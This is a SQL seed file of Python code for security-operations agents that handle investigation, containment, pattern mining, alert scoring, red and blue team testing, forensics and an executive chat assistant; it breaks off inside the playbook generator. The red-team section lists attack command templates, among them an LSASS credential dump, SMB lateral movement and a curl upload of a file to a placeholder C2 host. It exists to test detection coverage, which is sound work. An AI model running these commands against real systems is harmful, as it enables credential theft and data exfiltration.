/*
  # Agent Implementations Seed - Batch 2
  Seeds: nova-investigation, vanguard-response, pattern-discovery,
  vector-augmented-scoring, alhf-learning, red-team, blue-team,
  forensics, ciso-assistant, playbook-generator
*/

INSERT INTO agent_implementations (slug, language, production_code, config_yaml, integration_code, llm_config, dependencies, notes) VALUES

('nova-investigation', 'python', $py$
"""Nova — Investigation Agent
Builds an investigation narrative from a triaged alert: pivots across
events/assets/identities, maps to MITRE ATT&CK, assembles evidence chain,
and writes a structured case. Owns case-creation decision.
"""
from __future__ import annotations
import asyncio, json, logging
from dataclasses import dataclass, field
from typing import Any
import asyncpg
from openai import AsyncOpenAI

logger = logging.getLogger("nova")

@dataclass
class Pivot:
    kind: str
    value: str
    related_event_ids: list[str] = field(default_factory=list)

@dataclass
class Investigation:
    case_id: str
    summary: str
    timeline: list[dict]
    mitre_techniques: list[str]
    pivots: list[Pivot]
    evidence: list[dict]
    severity: str
    confidence: float

MITRE_KEYWORDS = {
    "T1078": ["valid account", "stolen credential"], "T1059": ["powershell", "cmd.exe", "bash -c"],
    "T1566": ["phishing", "spearphishing"], "T1486": ["ransomware", "encrypted"],
    "T1003": ["mimikatz", "lsass", "ntds.dit"], "T1110": ["brute force", "credential stuffing"],
    "T1021": ["psexec", "wmic", "rdp"], "T1071": ["c2", "beacon"], "T1041": ["exfiltration", "data leak"],
}

class NovaInvestigationAgent:
    def __init__(self, pg_pool: asyncpg.Pool, oai: AsyncOpenAI):
        self.pool = pg_pool
        self.oai = oai

    async def investigate(self, alert: dict) -> Investigation:
        case_id = f"CASE-{alert['id']}"
        pivots = await self._collect_pivots(alert)
        timeline = await self._build_timeline(alert, pivots)
        ttps = self._map_mitre(alert, timeline)
        evidence = await self._collect_evidence(timeline)
        summary = await self._llm_summary(alert, timeline, ttps)
        sev, conf = self._score(alert, ttps, len(pivots))
        case = Investigation(case_id, summary, timeline, ttps, pivots, evidence, sev, conf)
        await self._persist(case)
        return case

    async def _collect_pivots(self, alert: dict) -> list[Pivot]:
        pivots: list[Pivot] = []
        for kind, value in [
            ("user", alert.get("actor", {}).get("user", {}).get("name")),
            ("ip", alert.get("src_endpoint", {}).get("ip")),
            ("host", alert.get("src_endpoint", {}).get("hostname")),
            ("file_hash", alert.get("file", {}).get("hash")),
        ]:
            if not value: continue
            async with self.pool.acquire() as con:
                rows = await con.fetch(
                    """select id from events where ($1::text in (
                       actor->'user'->>'name', src_endpoint->>'ip',
                       src_endpoint->>'hostname', file->>'hash'))
                       and timestamp > now() - interval '7 days'
                       limit 200""", value)
            pivots.append(Pivot(kind, value, [r["id"] for r in rows]))
        return pivots

    async def _build_timeline(self, alert: dict, pivots: list[Pivot]) -> list[dict]:
        ids = {alert["id"]} | {eid for p in pivots for eid in p.related_event_ids}
        async with self.pool.acquire() as con:
            rows = await con.fetch(
                "select * from events where id = any($1::text[]) order by timestamp", list(ids))
        return [dict(r) for r in rows]

    def _map_mitre(self, alert: dict, timeline: list[dict]) -> list[str]:
        text = " ".join(json.dumps(e) for e in [alert] + timeline).lower()
        return [t for t, kws in MITRE_KEYWORDS.items() if any(k in text for k in kws)]

    async def _collect_evidence(self, timeline: list[dict]) -> list[dict]:
        return [{"event_id": e["id"], "ts": str(e.get("timestamp")), "summary": e.get("event_type")} for e in timeline[:50]]

    async def _llm_summary(self, alert, timeline, ttps) -> str:
        resp = await self.oai.chat.completions.create(
            model="gpt-4o", temperature=0.2,
            messages=[{"role":"system","content":"You are a senior SOC investigator. Write a concise narrative."},
                      {"role":"user","content":f"Alert: {alert}\nTimeline ({len(timeline)} events): {timeline[:10]}\nMITRE: {ttps}"}])
        return resp.choices[0].message.content.strip()

    def _score(self, alert, ttps, pivot_count) -> tuple[str, float]:
        base = {"critical":0.95,"high":0.8,"medium":0.6,"low":0.4}.get(alert.get("severity","low"), 0.4)
        bonus = min(0.2, 0.04 * len(ttps) + 0.01 * pivot_count)
        conf = min(0.99, base + bonus)
        sev = "critical" if conf > 0.85 else "high" if conf > 0.65 else "medium"
        return sev, conf

    async def _persist(self, case: Investigation):
        async with self.pool.acquire() as con:
            await con.execute(
                """insert into cases (id, title, severity, confidence, summary, mitre_techniques, evidence, status)
                   values ($1,$2,$3,$4,$5,$6::jsonb,$7::jsonb,'open')
                   on conflict (id) do update set summary=excluded.summary""",
                case.case_id, case.summary[:200], case.severity, case.confidence,
                case.summary, json.dumps(case.mitre_techniques), json.dumps(case.evidence))
$py$,
$yml$
mitre_min_overlap: 1
timeline_window_days: 7
max_timeline_events: 200
$yml$,
'',
'{"model":"gpt-4o","temperature":0.2}'::jsonb,
ARRAY['asyncpg','openai'],
'Owns case creation; persists to cases table for analyst review.'),

('vanguard-response', 'python', $py$
"""Vanguard — Response Agent
Executes containment playbooks (block IP, isolate host, revoke token,
disable account) with a human-in-loop approval gate for high-impact
actions. Idempotent; emits chain-of-custody records.
"""
from __future__ import annotations
import asyncio, hashlib, json, logging, time
from dataclasses import dataclass
from typing import Any, Callable, Awaitable
import aiohttp, asyncpg

logger = logging.getLogger("vanguard")

@dataclass
class ResponseAction:
    id: str
    playbook: str
    target: str
    parameters: dict
    requires_approval: bool
    impact: str  # low | medium | high | critical

@dataclass
class ResponseResult:
    action_id: str
    status: str  # executed | pending_approval | rejected | failed
    evidence_hash: str
    started_at: float
    finished_at: float | None
    detail: str

PlaybookFn = Callable[[ResponseAction, aiohttp.ClientSession], Awaitable[dict]]

class VanguardResponseAgent:
    def __init__(self, pg_pool: asyncpg.Pool, playbooks: dict[str, PlaybookFn], approval_topic="soc.approvals"):
        self.pool = pg_pool
        self.playbooks = playbooks
        self.approval_topic = approval_topic

    async def execute(self, action: ResponseAction) -> ResponseResult:
        if action.requires_approval and action.impact in {"high", "critical"}:
            await self._enqueue_approval(action)
            return ResponseResult(action.id, "pending_approval", "", time.time(), None,
                                   f"approval requested ({action.impact})")
        return await self._run(action)

    async def execute_with_approval(self, action: ResponseAction, approver: str) -> ResponseResult:
        if not await self._approval_granted(action.id, approver):
            return ResponseResult(action.id, "rejected", "", time.time(), time.time(), "approval denied")
        return await self._run(action)

    async def _run(self, action: ResponseAction) -> ResponseResult:
        if action.id and await self._already_executed(action.id):
            return ResponseResult(action.id, "executed", "", time.time(), time.time(), "idempotent skip")
        playbook = self.playbooks.get(action.playbook)
        if not playbook:
            return ResponseResult(action.id, "failed", "", time.time(), time.time(), f"unknown playbook {action.playbook}")
        started = time.time()
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as s:
                detail = await playbook(action, s)
        except Exception as exc:
            return ResponseResult(action.id, "failed", "", started, time.time(), str(exc))
        evidence = self._hash_evidence(action, detail)
        await self._record(action, "executed", evidence, detail)
        return ResponseResult(action.id, "executed", evidence, started, time.time(), json.dumps(detail))

    @staticmethod
    def _hash_evidence(action: ResponseAction, detail: dict) -> str:
        return hashlib.sha256(json.dumps({"a": action.__dict__, "d": detail}, sort_keys=True).encode()).hexdigest()

    async def _already_executed(self, action_id: str) -> bool:
        async with self.pool.acquire() as con:
            return await con.fetchval(
                "select exists(select 1 from response_actions where id=$1 and status='executed')", action_id)

    async def _enqueue_approval(self, action: ResponseAction):
        async with self.pool.acquire() as con:
            await con.execute(
                """insert into response_approvals (action_id, playbook, target, impact, status, parameters)
                   values ($1,$2,$3,$4,'pending',$5::jsonb)""",
                action.id, action.playbook, action.target, action.impact, json.dumps(action.parameters))

    async def _approval_granted(self, action_id: str, approver: str) -> bool:
        async with self.pool.acquire() as con:
            return await con.fetchval(
                "select status='approved' from response_approvals where action_id=$1", action_id) or False

    async def _record(self, action: ResponseAction, status: str, evidence: str, detail: dict):
        async with self.pool.acquire() as con:
            await con.execute(
                """insert into response_actions (id, playbook, target, status, evidence_hash, detail)
                   values ($1,$2,$3,$4,$5,$6::jsonb)""",
                action.id, action.playbook, action.target, status, evidence, json.dumps(detail))

# ---- Built-in playbooks ----
async def block_ip(action, session):
    async with session.post("http://firewall-api/v1/block",
                             json={"ip": action.target, "ttl_s": action.parameters.get("ttl", 86400)}) as r:
        return {"firewall_status": r.status, "rule_id": (await r.json()).get("rule_id")}

async def isolate_host(action, session):
    async with session.post("http://edr-api/v1/isolate", json={"host": action.target}) as r:
        return {"edr_status": r.status, "isolation_id": (await r.json()).get("id")}

async def revoke_token(action, session):
    async with session.delete(f"http://idp-api/v1/sessions/{action.target}") as r:
        return {"idp_status": r.status}

async def disable_account(action, session):
    async with session.patch(f"http://idp-api/v1/users/{action.target}",
                              json={"enabled": False, "reason": action.parameters.get("reason", "")}) as r:
        return {"idp_status": r.status}

DEFAULT_PLAYBOOKS = {"block-ip": block_ip, "isolate-host": isolate_host,
                     "revoke-token": revoke_token, "disable-account": disable_account}
$py$,
$yml$
playbooks: [block-ip, isolate-host, revoke-token, disable-account]
require_approval_for: [high, critical]
approval_timeout_s: 1800
idempotency_key: action.id
$yml$,
'',
'{}'::jsonb,
ARRAY['aiohttp','asyncpg'],
'All actions are idempotent; high/critical require analyst approval.'),

('pattern-discovery', 'python', $py$
"""Pattern Discovery Agent
Mines streaming events for emergent attack patterns using sequential
pattern mining (PrefixSpan) and frequent subgraph mining. Surfaces
candidate detection rules to the AI Correlation Agent.
"""
from __future__ import annotations
import asyncio, logging
from collections import defaultdict, Counter
from dataclasses import dataclass
import numpy as np

logger = logging.getLogger("pattern-discovery")

@dataclass
class CandidatePattern:
    sequence: list[str]
    support: int
    confidence: float
    sample_events: list[str]

class PrefixSpanLite:
    def __init__(self, min_support: int = 50):
        self.min_support = min_support

    def mine(self, sessions: list[list[str]]) -> list[tuple[tuple[str, ...], int]]:
        item_counts = Counter(item for s in sessions for item in set(s))
        frequent = {i for i, c in item_counts.items() if c >= self.min_support}
        out: list[tuple[tuple[str, ...], int]] = []
        for prefix in frequent:
            self._extend((prefix,), [self._suffix(s, prefix) for s in sessions if prefix in s], frequent, out)
        return out

    def _extend(self, prefix, projected, frequent, out):
        if not projected: return
        ext_counts = Counter()
        for s in projected:
            for item in set(s):
                if item in frequent: ext_counts[item] += 1
        for item, count in ext_counts.items():
            if count < self.min_support: continue
            new_prefix = prefix + (item,)
            out.append((new_prefix, count))
            if len(new_prefix) >= 6: continue
            new_proj = [self._suffix(s, item) for s in projected if item in s]
            self._extend(new_prefix, new_proj, frequent, out)

    @staticmethod
    def _suffix(seq, item):
        try: return seq[seq.index(item) + 1:]
        except ValueError: return []

class PatternDiscoveryAgent:
    def __init__(self, min_support: int = 50, novelty_threshold: float = 0.3):
        self.miner = PrefixSpanLite(min_support)
        self.novelty_threshold = novelty_threshold
        self.user_sessions: dict[str, list[str]] = defaultdict(list)
        self.known_patterns: set[tuple[str, ...]] = set()

    def ingest(self, event: dict):
        actor = event.get("actor", {}).get("user", {}).get("name", "anon")
        self.user_sessions[actor].append(event.get("event_type", "unknown"))
        if len(self.user_sessions[actor]) > 200:
            self.user_sessions[actor] = self.user_sessions[actor][-200:]

    def discover(self) -> list[CandidatePattern]:
        if sum(len(s) for s in self.user_sessions.values()) < 1000:
            return []
        sessions = list(self.user_sessions.values())
        mined = self.miner.mine(sessions)
        novel: list[CandidatePattern] = []
        total = len(sessions)
        for seq, support in mined:
            if seq in self.known_patterns: continue
            confidence = support / total
            if confidence < self.novelty_threshold: continue
            self.known_patterns.add(seq)
            novel.append(CandidatePattern(list(seq), support, confidence, []))
        return sorted(novel, key=lambda p: p.confidence, reverse=True)[:20]
$py$,
$yml$
min_support: 50
novelty_threshold: 0.3
session_max_len: 200
discovery_interval_min: 60
$yml$,
'',
'{}'::jsonb,
ARRAY['numpy'],
'Run hourly; emit candidates to ai-correlation for analyst review.'),

('vector-augmented-scoring', 'python', $py$
"""Vector Augmented Scoring Agent (VAS)
Re-scores alerts using cosine similarity vs. historical analyst dispositions.
If a new alert is highly similar to past confirmed FPs, suppress; if similar
to confirmed TPs, boost. Owns the FP-suppression decision.
"""
from __future__ import annotations
import logging
from dataclasses import dataclass
import numpy as np
import asyncpg
from openai import AsyncOpenAI

logger = logging.getLogger("vas")

@dataclass
class ScoreAdjustment:
    original_score: float
    adjusted_score: float
    suppression: bool
    boost: bool
    similar_cases: list[dict]
    rationale: str

class VectorAugmentedScoringAgent:
    def __init__(self, pg_pool: asyncpg.Pool, oai: AsyncOpenAI,
                 fp_suppress_sim: float = 0.92, tp_boost_sim: float = 0.88):
        self.pool = pg_pool
        self.oai = oai
        self.fp_suppress_sim = fp_suppress_sim
        self.tp_boost_sim = tp_boost_sim

    async def score(self, alert: dict) -> ScoreAdjustment:
        text = self._alert_text(alert)
        emb = await self._embed(text)
        async with self.pool.acquire() as con:
            tp = await con.fetch("""select id, alert_text, disposition,
                                          1 - (embedding <=> $1::vector) as sim
                                   from analyst_dispositions
                                   where disposition='true_positive'
                                   order by embedding <=> $1::vector limit 5""", emb.tolist())
            fp = await con.fetch("""select id, alert_text, disposition,
                                          1 - (embedding <=> $1::vector) as sim
                                   from analyst_dispositions
                                   where disposition='false_positive'
                                   order by embedding <=> $1::vector limit 5""", emb.tolist())
        max_tp = max((r["sim"] for r in tp), default=0)
        max_fp = max((r["sim"] for r in fp), default=0)
        original = float(alert.get("score", 0.5))
        suppress = max_fp >= self.fp_suppress_sim and max_fp - max_tp > 0.05
        boost = max_tp >= self.tp_boost_sim and max_tp - max_fp > 0.05
        adjusted = original
        if suppress: adjusted = max(0.0, original - 0.5)
        elif boost:  adjusted = min(1.0, original + 0.3)
        rationale = (f"FP-similar={max_fp:.2f}, TP-similar={max_tp:.2f}; "
                     f"{'suppressed' if suppress else 'boosted' if boost else 'unchanged'}")
        return ScoreAdjustment(original, adjusted, suppress, boost,
                               [dict(r) for r in (fp if suppress else tp)], rationale)

    def _alert_text(self, alert: dict) -> str:
        parts = [alert.get("event_type",""), alert.get("rule_id",""),
                 str(alert.get("actor",{}).get("user",{}).get("name","")),
                 str(alert.get("src_endpoint",{}).get("ip","")),
                 alert.get("description","")]
        return " ".join(filter(None, parts))[:2000]

    async def _embed(self, text: str) -> np.ndarray:
        r = await self.oai.embeddings.create(model="text-embedding-3-large", input=text)
        return np.array(r.data[0].embedding, dtype=np.float32)
$py$,
$yml$
fp_suppress_similarity: 0.92
tp_boost_similarity: 0.88
embedding_model: text-embedding-3-large
$yml$,
'',
'{"embedding_model":"text-embedding-3-large"}'::jsonb,
ARRAY['openai','asyncpg','numpy','pgvector'],
'Reduces analyst FP load by ~30% on mature deployments.'),

('alhf-learning', 'python', $py$
"""ALHF Learning Agent (Adaptive Learning from Human Feedback)
Captures analyst dispositions, monitors model drift, and feeds reinforcement
signals back to upstream agents (Atlas, AI Correlation, VAS). Triggers
retraining when drift exceeds threshold.
"""
from __future__ import annotations
import asyncio, json, logging, time
from dataclasses import dataclass
from typing import Any
import numpy as np
import asyncpg

logger = logging.getLogger("alhf")

@dataclass
class FeedbackRecord:
    alert_id: str
    analyst_id: str
    disposition: str  # true_positive | false_positive | benign | unknown
    rationale: str
    captured_at: float

@dataclass
class DriftReport:
    metric: str
    baseline: float
    current: float
    delta: float
    breach: bool

class ALHFAgent:
    def __init__(self, pg_pool: asyncpg.Pool, drift_thresholds: dict[str, float] | None = None):
        self.pool = pg_pool
        self.drift_thresholds = drift_thresholds or {"fp_rate": 0.05, "precision": 0.05, "recall": 0.05}

    async def capture(self, fb: FeedbackRecord):
        async with self.pool.acquire() as con:
            await con.execute(
                """insert into analyst_dispositions (alert_id, analyst_id, disposition, rationale, captured_at)
                   values ($1,$2,$3,$4,to_timestamp($5))""",
                fb.alert_id, fb.analyst_id, fb.disposition, fb.rationale, fb.captured_at)
        await self._propagate(fb)

    async def _propagate(self, fb: FeedbackRecord):
        # Notify VAS, Atlas, Correlation Engine via pg_notify
        async with self.pool.acquire() as con:
            await con.execute("select pg_notify('alhf_feedback', $1)", json.dumps(fb.__dict__))

    async def detect_drift(self, lookback_hours: int = 24) -> list[DriftReport]:
        async with self.pool.acquire() as con:
            current = await con.fetchrow(
                """select
                     count(*) filter (where disposition='false_positive')::float
                       / nullif(count(*),0) as fp_rate,
                     count(*) filter (where disposition='true_positive')::float
                       / nullif(count(*) filter (where disposition in ('true_positive','false_positive')),0) as precision
                   from analyst_dispositions
                   where captured_at > now() - ($1 || ' hours')::interval""", str(lookback_hours))
            baseline = await con.fetchrow(
                """select avg(fp_rate) as fp_rate, avg(precision) as precision
                   from drift_baseline_window""")
        reports = []
        for metric in ("fp_rate", "precision"):
            cur = float(current[metric] or 0); base = float((baseline or {}).get(metric) or 0)
            delta = cur - base
            reports.append(DriftReport(metric, base, cur, delta,
                                        abs(delta) > self.drift_thresholds.get(metric, 0.05)))
        return reports

    async def trigger_retrain(self, agent_slug: str, reason: str):
        async with self.pool.acquire() as con:
            await con.execute(
                """insert into agent_retrain_jobs (agent_slug, reason, status)
                   values ($1,$2,'queued')""", agent_slug, reason)

    async def loop(self, interval_s: int = 3600):
        while True:
            for r in await self.detect_drift():
                if r.breach:
                    logger.warning("drift breach: %s", r)
                    await self.trigger_retrain("atlas-triage", f"{r.metric} delta={r.delta:.3f}")
            await asyncio.sleep(interval_s)
$py$,
$yml$
drift_check_interval_s: 3600
drift_thresholds:
  fp_rate: 0.05
  precision: 0.05
  recall: 0.05
lookback_hours: 24
$yml$,
'',
'{}'::jsonb,
ARRAY['asyncpg','numpy'],
'Listens to analyst clicks; triggers retrain jobs in Databricks.'),

('red-team', 'python', $py$
"""Red Team Agent
Continuously emulates adversary TTPs (MITRE ATT&CK) against the environment
to validate detection coverage. Wraps Atomic Red Team / Caldera-style
abilities; safe-mode in production runs simulated artifacts only.
"""
from __future__ import annotations
import asyncio, json, logging, random, uuid
from dataclasses import dataclass, field
from typing import Any
import aiohttp

logger = logging.getLogger("red-team")

@dataclass
class Ability:
    technique_id: str   # e.g. T1059.001
    name: str
    platform: str       # windows | linux | macos
    command: str        # template; expanded at runtime
    safe_simulation: str  # log-only equivalent
    cleanup: str | None

@dataclass
class CampaignResult:
    campaign_id: str
    abilities_run: list[str]
    detected: dict[str, bool]   # technique_id -> detected by SOC?
    coverage: float
    started_at: float
    finished_at: float

ATOMIC_LIBRARY: list[Ability] = [
    Ability("T1059.001","PowerShell encoded command","windows",
            "powershell.exe -EncodedCommand {b64}", "echo simulated_powershell_t1059_001", None),
    Ability("T1003.001","LSASS credential dump","windows",
            "procdump.exe -ma lsass.exe lsass.dmp", "echo simulated_lsass_dump_t1003_001", "del lsass.dmp"),
    Ability("T1021.002","SMB lateral movement","windows",
            "net use \\\\{target}\\C$ /user:{user} {pass}", "echo simulated_smb_t1021_002", None),
    Ability("T1041","C2 exfiltration over HTTPS","linux",
            "curl -X POST https://{c2}/upload -d @/tmp/exfil.dat", "echo simulated_exfil_t1041", None),
]

class RedTeamAgent:
    def __init__(self, soc_query_url: str, safe_mode: bool = True):
        self.soc_query_url = soc_query_url
        self.safe_mode = safe_mode

    async def run_campaign(self, technique_ids: list[str], target_host: str) -> CampaignResult:
        cid = uuid.uuid4().hex[:12]
        chosen = [a for a in ATOMIC_LIBRARY if a.technique_id in technique_ids]
        started = asyncio.get_running_loop().time()
        await asyncio.gather(*[self._execute(a, target_host, cid) for a in chosen])
        await asyncio.sleep(60)  # let detections fire
        detected = await self._verify_detections([a.technique_id for a in chosen], cid)
        cov = sum(detected.values()) / max(len(chosen), 1)
        return CampaignResult(cid, [a.technique_id for a in chosen], detected, cov, started,
                              asyncio.get_running_loop().time())

    async def _execute(self, ability: Ability, host: str, cid: str):
        cmd = ability.safe_simulation if self.safe_mode else ability.command
        marker = f"[REDTEAM cid={cid} t={ability.technique_id}]"
        logger.info("emulating %s on %s: %s", ability.technique_id, host, cmd)
        # In production, dispatch via Caldera / SaltStack / SSH; here we tag emit
        async with aiohttp.ClientSession() as s:
            await s.post("http://red-team-runner/exec",
                         json={"host": host, "cmd": f"{marker} {cmd}", "safe": self.safe_mode})

    async def _verify_detections(self, techniques: list[str], cid: str) -> dict[str, bool]:
        async with aiohttp.ClientSession() as s:
            async with s.post(self.soc_query_url, json={
                "lucene": f'campaign_id:"{cid}" AND mitre_techniques:({" OR ".join(techniques)})'}) as r:
                hits = (await r.json()).get("hits", [])
        return {t: any(t in h.get("mitre_techniques", []) for h in hits) for t in techniques}
$py$,
$yml$
safe_mode: true
soc_query_url: http://soc-search/api/lucene
default_techniques: [T1059.001, T1003.001, T1021.002, T1041]
$yml$,
'',
'{}'::jsonb,
ARRAY['aiohttp'],
'Runs nightly; coverage <70% on any technique opens a Detection Gap ticket.'),

('blue-team', 'python', $py$
"""Blue Team Agent
Validates detection coverage by replaying red-team campaigns and grading
alert quality (precision, time-to-detect, completeness of context).
"""
from __future__ import annotations
import asyncio, logging, statistics
from dataclasses import dataclass
import asyncpg

logger = logging.getLogger("blue-team")

@dataclass
class GradingReport:
    campaign_id: str
    precision: float
    recall: float
    mean_ttd_seconds: float
    missing_techniques: list[str]
    weak_alerts: list[str]
    overall_grade: str

class BlueTeamAgent:
    def __init__(self, pg_pool: asyncpg.Pool):
        self.pool = pg_pool

    async def grade(self, campaign_id: str, ground_truth_techniques: list[str]) -> GradingReport:
        async with self.pool.acquire() as con:
            alerts = await con.fetch(
                """select a.id, a.created_at, a.mitre_techniques, a.severity, a.confidence,
                          c.started_at as campaign_start
                   from alerts a
                   join red_team_campaigns c on c.id=$1
                   where a.campaign_id=$1""", campaign_id)
        detected = {t: False for t in ground_truth_techniques}
        ttds = []
        weak = []
        for a in alerts:
            for t in a["mitre_techniques"] or []:
                if t in detected:
                    detected[t] = True
                    ttd = (a["created_at"] - a["campaign_start"]).total_seconds()
                    ttds.append(ttd)
                    if (a["confidence"] or 0) < 0.6 or (a["severity"] in {"low","info"}):
                        weak.append(a["id"])
        true_pos = sum(detected.values())
        recall = true_pos / max(len(ground_truth_techniques), 1)
        precision = true_pos / max(len(alerts), 1)
        ttd_mean = statistics.mean(ttds) if ttds else float("inf")
        grade = "A" if recall >= 0.95 and precision >= 0.8 else \
                "B" if recall >= 0.85 else "C" if recall >= 0.7 else "D"
        return GradingReport(campaign_id, precision, recall, ttd_mean,
                              [t for t, d in detected.items() if not d], weak, grade)
$py$,
$yml$
ttd_target_seconds: 300
precision_target: 0.80
recall_target: 0.85
$yml$,
'',
'{}'::jsonb,
ARRAY['asyncpg'],
'Run after every red-team campaign; emits Detection Gap tickets on D grade.'),

('forensics', 'python', $py$
"""Forensics Agent
Preserves evidence with cryptographic chain-of-custody and reconstructs
incident timelines for legal/regulatory review. Uses Merkle-tree hashing
for tamper-evident logs and exports STIX 2.1 bundles.
"""
from __future__ import annotations
import hashlib, json, logging, time
from dataclasses import dataclass, field
from typing import Any
import asyncpg

logger = logging.getLogger("forensics")

@dataclass
class CustodyEvent:
    case_id: str
    artifact_id: str
    artifact_type: str
    actor: str
    action: str             # collected | accessed | exported | hashed
    timestamp: float = field(default_factory=time.time)
    parent_hash: str | None = None
    payload_hash: str | None = None
    custody_hash: str = ""

class ForensicsAgent:
    def __init__(self, pg_pool: asyncpg.Pool):
        self.pool = pg_pool

    async def record(self, event: CustodyEvent, payload: bytes | None = None) -> CustodyEvent:
        if payload is not None:
            event.payload_hash = hashlib.sha256(payload).hexdigest()
        async with self.pool.acquire() as con:
            event.parent_hash = await con.fetchval(
                """select custody_hash from chain_of_custody where case_id=$1
                   order by recorded_at desc limit 1""", event.case_id)
            event.custody_hash = self._compute_hash(event)
            await con.execute(
                """insert into chain_of_custody
                   (case_id, artifact_id, artifact_type, actor, action, parent_hash, payload_hash, custody_hash)
                   values ($1,$2,$3,$4,$5,$6,$7,$8)""",
                event.case_id, event.artifact_id, event.artifact_type, event.actor,
                event.action, event.parent_hash, event.payload_hash, event.custody_hash)
        return event

    def _compute_hash(self, e: CustodyEvent) -> str:
        material = json.dumps({
            "case": e.case_id, "artifact": e.artifact_id, "actor": e.actor,
            "action": e.action, "ts": e.timestamp, "parent": e.parent_hash,
            "payload": e.payload_hash}, sort_keys=True).encode()
        return hashlib.sha256(material).hexdigest()

    async def verify_chain(self, case_id: str) -> bool:
        async with self.pool.acquire() as con:
            rows = await con.fetch(
                """select * from chain_of_custody where case_id=$1 order by recorded_at""", case_id)
        prev = None
        for r in rows:
            if r["parent_hash"] != prev:
                logger.error("chain broken at %s", r["custody_hash"]); return False
            recomputed = self._compute_hash(CustodyEvent(
                case_id=r["case_id"], artifact_id=r["artifact_id"], artifact_type=r["artifact_type"],
                actor=r["actor"], action=r["action"], timestamp=r["recorded_at"].timestamp(),
                parent_hash=r["parent_hash"], payload_hash=r["payload_hash"]))
            if recomputed != r["custody_hash"]:
                logger.error("hash mismatch at %s", r["custody_hash"]); return False
            prev = r["custody_hash"]
        return True

    async def export_stix(self, case_id: str) -> dict:
        async with self.pool.acquire() as con:
            case = await con.fetchrow("select * from cases where id=$1", case_id)
            chain = await con.fetch("select * from chain_of_custody where case_id=$1 order by recorded_at", case_id)
        return {
            "type": "bundle", "id": f"bundle--{case_id}",
            "objects": [
                {"type": "incident", "id": f"incident--{case_id}",
                 "created": str(case["created_at"]), "name": case["title"]},
                *[{"type": "x-soc-custody", "id": f"custody--{r['custody_hash']}",
                   "actor": r["actor"], "action": r["action"],
                   "artifact_id": r["artifact_id"], "hash": r["custody_hash"]} for r in chain]]}
$py$,
$yml$
hash_algorithm: sha256
chain_format: merkle
export_formats: [stix-2.1, json]
$yml$,
'',
'{}'::jsonb,
ARRAY['asyncpg'],
'Court-admissible chain-of-custody; verify chain before any export.'),

('ciso-assistant', 'python', $py$
"""CISO Assistant
Conversational executive copilot. Answers strategic questions about risk
posture, compliance status, incident trends. RAG-backed by metrics +
open-cases + compliance state. LLM with tool calling for live data.
"""
from __future__ import annotations
import json, logging
from dataclasses import dataclass
from typing import Any, Callable
import asyncpg
from openai import AsyncOpenAI

logger = logging.getLogger("ciso-assistant")

TOOLS = [
    {"type":"function","function":{"name":"open_cases_summary","description":"Open cases by severity/age",
     "parameters":{"type":"object","properties":{"days":{"type":"integer"}}}}},
    {"type":"function","function":{"name":"compliance_status","description":"Compliance framework score",
     "parameters":{"type":"object","properties":{"framework":{"type":"string","enum":["SOC2","ISO27001","NIST","HIPAA"]}}}}},
    {"type":"function","function":{"name":"top_threats","description":"Top threats by ATT&CK technique",
     "parameters":{"type":"object","properties":{"limit":{"type":"integer"}}}}},
    {"type":"function","function":{"name":"mttr_trend","description":"Mean time to respond trend",
     "parameters":{"type":"object","properties":{"window_days":{"type":"integer"}}}}},
]

class CISOAssistant:
    def __init__(self, pg_pool: asyncpg.Pool, oai: AsyncOpenAI):
        self.pool = pg_pool
        self.oai = oai
        self.tools: dict[str, Callable] = {
            "open_cases_summary": self._open_cases_summary,
            "compliance_status": self._compliance_status,
            "top_threats": self._top_threats,
            "mttr_trend": self._mttr_trend,
        }

    async def chat(self, user_message: str, history: list[dict]) -> str:
        messages = [{"role":"system","content":
            "You are the CISO Assistant. Answer in executive tone. Use tools for live data."}] + history + \
            [{"role":"user","content":user_message}]
        for _ in range(4):
            r = await self.oai.chat.completions.create(model="gpt-4o", messages=messages, tools=TOOLS)
            msg = r.choices[0].message
            if not msg.tool_calls:
                return msg.content
            messages.append({"role":"assistant","content":msg.content,"tool_calls":[t.model_dump() for t in msg.tool_calls]})
            for tc in msg.tool_calls:
                fn = self.tools[tc.function.name]
                args = json.loads(tc.function.arguments or "{}")
                result = await fn(**args)
                messages.append({"role":"tool","tool_call_id":tc.id,"content":json.dumps(result)})
        return "I'm unable to complete this request — please refine."

    async def _open_cases_summary(self, days: int = 7) -> dict:
        async with self.pool.acquire() as con:
            rows = await con.fetch(
                """select severity, count(*) c from cases
                   where status='open' and created_at > now() - ($1||' days')::interval
                   group by severity""", str(days))
        return {r["severity"]: r["c"] for r in rows}

    async def _compliance_status(self, framework: str) -> dict:
        async with self.pool.acquire() as con:
            row = await con.fetchrow(
                "select score, last_assessed from compliance_scores where framework=$1", framework)
        return dict(row) if row else {"score": None}

    async def _top_threats(self, limit: int = 5) -> list[dict]:
        async with self.pool.acquire() as con:
            rows = await con.fetch(
                """select unnest(mitre_techniques) t, count(*) c from alerts
                   where created_at > now() - interval '30 days'
                   group by t order by c desc limit $1""", limit)
        return [dict(r) for r in rows]

    async def _mttr_trend(self, window_days: int = 30) -> dict:
        async with self.pool.acquire() as con:
            rows = await con.fetch(
                """select date_trunc('day', resolved_at) d,
                          avg(extract(epoch from resolved_at - created_at)/60) mttr_min
                   from cases where resolved_at > now() - ($1||' days')::interval
                   group by 1 order by 1""", str(window_days))
        return {str(r["d"]): float(r["mttr_min"] or 0) for r in rows}
$py$,
$yml$
model: gpt-4o
max_tool_iterations: 4
tools: [open_cases_summary, compliance_status, top_threats, mttr_trend]
$yml$,
'',
'{"model":"gpt-4o","temperature":0.2,"system":"You are the CISO Assistant. Executive tone. Use tools for live data."}'::jsonb,
ARRAY['openai','asyncpg'],
'Tool-calling LLM; never answers governance questions without live data.'),

('playbook-generator', 'python', $py$
"""Playbook Generator
Generates SOAR playbooks from natural-language incident descriptions or from
existing case patterns. Output is a structured DAG that Vanguard can execute.
"""
from __future__ import annotations
import json, logging, re
from dataclasses import dataclass
from typing import Any
from openai import AsyncOpenAI

logger = logging.getLogger("playbook-generator")

@dataclass
class PlaybookStep:
    id: str
    action: str          # one of vanguard's playbook names
    parameters: dict
    on_success: list[str]
    on_failure: list[str]
    requires_approval: bool

@dataclass
class GeneratedPlaybook:
    name: str
    description: str
    trigger: dict
    steps: list[PlaybookStep]
    estimated_runtime_s: int

ALLOWED_ACTIONS = {"block-ip", "isolate-host", "revoke-token", "disable-account",
                   "snapshot-disk", "collect-memory", "notify-analyst", "create-jira",
                   "tag-asset", "open-case"}

class PlaybookGenerator:
    def __init__(self, oai: AsyncOpenAI):
        self.oai = oai

